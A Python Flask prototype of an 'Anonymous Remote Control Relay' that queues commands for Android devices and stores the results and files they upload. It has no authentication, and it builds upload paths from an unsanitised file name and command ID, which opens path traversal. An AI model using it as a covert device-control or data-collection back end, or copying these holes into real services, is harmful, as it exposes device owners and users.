from flask import Flask, request, jsonify, send_file
from datetime import datetime, timedelta
import uuid
import os
import threading
import time

app = Flask(__name__)

# In-memory storage (no database needed for prototype)
command_queue = {}  # {device_id: [commands]}
results_store = {}  # {command_id: {data, timestamp}}
device_last_seen = {}  # {device_id: timestamp}

# Auto-cleanup old data every 5 minutes
RESULT_EXPIRY = timedelta(hours=1)  # Results deleted after 1 hour
DEVICE_TIMEOUT = timedelta(minutes=10)  # Device considered offline after 10 min

def cleanup_old_data():
    """Background thread to remove expired results"""
    while True:
        time.sleep(300)  # Run every 5 minutes
        now = datetime.now()
        
        # Clean expired results
        expired = [k for k, v in results_store.items() 
                   if now - v['timestamp'] > RESULT_EXPIRY]
        for k in expired:
            if 'file_path' in results_store[k]:
                try:
                    os.remove(results_store[k]['file_path'])
                except:
                    pass
            del results_store[k]
        
        if expired:
            print(f"Cleaned up {len(expired)} expired results")

# Start cleanup thread
cleanup_thread = threading.Thread(target=cleanup_old_data, daemon=True)
cleanup_thread.start()

@app.route('/')
def home():
    return jsonify({
        'status': 'online',
        'service': 'Anonymous Remote Control Relay',
        'active_devices': len([d for d, t in device_last_seen.items() 
                               if datetime.now() - t < DEVICE_TIMEOUT])
    })

@app.route('/command', methods=['POST'])
def post_command():
    """Linux CLI posts commands here"""
    data = request.json
    
    if not data or 'device_id' not in data or 'action' not in data:
        return jsonify({'error': 'Missing device_id or action'}), 400
    
    device_id = data['device_id']
    command_id = str(uuid.uuid4())
    
    command = {
        'id': command_id,
        'action': data['action'],
        'params': data.get('params', {}),
        'timestamp': datetime.now().isoformat()
    }
    
    if device_id not in command_queue:
        command_queue[device_id] = []
    
    command_queue[device_id].append(command)
    
    return jsonify({
        'success': True,
        'command_id': command_id,
        'message': f'Command queued for device {device_id}'
    })

@app.route('/command/<device_id>', methods=['GET'])
def get_commands(device_id):
    """Android polls this endpoint for commands"""
    device_last_seen[device_id] = datetime.now()
    
    if device_id not in command_queue or not command_queue[device_id]:
        return jsonify({'commands': []})
    
    # Return all pending commands and clear queue
    commands = command_queue[device_id]
    command_queue[device_id] = []
    
    return jsonify({'commands': commands})

@app.route('/result/<command_id>', methods=['POST'])
def post_result(command_id):
    """Android uploads results here"""
    
    # Handle file upload
    if 'file' in request.files:
        file = request.files['file']
        if file.filename:
            # Save file temporarily
            upload_dir = 'uploads'
            os.makedirs(upload_dir, exist_ok=True)
            file_path = os.path.join(upload_dir, f"{command_id}_{file.filename}")
            file.save(file_path)
            
            results_store[command_id] = {
                'type': 'file',
                'file_path': file_path,
                'filename': file.filename,
                'timestamp': datetime.now()
            }
            
            return jsonify({'success': True, 'message': 'File uploaded'})
    
    # Handle JSON data
    data = request.json
    if data:
        results_store[command_id] = {
            'type': 'data',
            'data': data,
            'timestamp': datetime.now()
        }
        return jsonify({'success': True, 'message': 'Result stored'})
    
    return jsonify({'error': 'No data or file provided'}), 400

@app.route('/result/<command_id>', methods=['GET'])
def get_result(command_id):
    """Linux retrieves results here"""
    
    if command_id not in results_store:
        return jsonify({'error': 'Result not found or expired'}), 404
    
    result = results_store[command_id]
    
    if result['type'] == 'file':
        return send_file(result['file_path'], 
                        download_name=result['filename'],
                        as_attachment=True)
    else:
        return jsonify(result['data'])

@app.route('/devices', methods=['GET'])
def list_devices():
    """List active devices (for debugging)"""
    now = datetime.now()
    active = {
        device_id: {
            'last_seen': timestamp.isoformat(),
            'seconds_ago': int((now - timestamp).total_seconds()),
            'status': 'online' if now - timestamp < DEVICE_TIMEOUT else 'offline'
        }
        for device_id, timestamp in device_last_seen.items()
    }
    return jsonify({'devices': active})

@app.route('/health', methods=['GET'])
def health():
    """Health check endpoint"""
    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
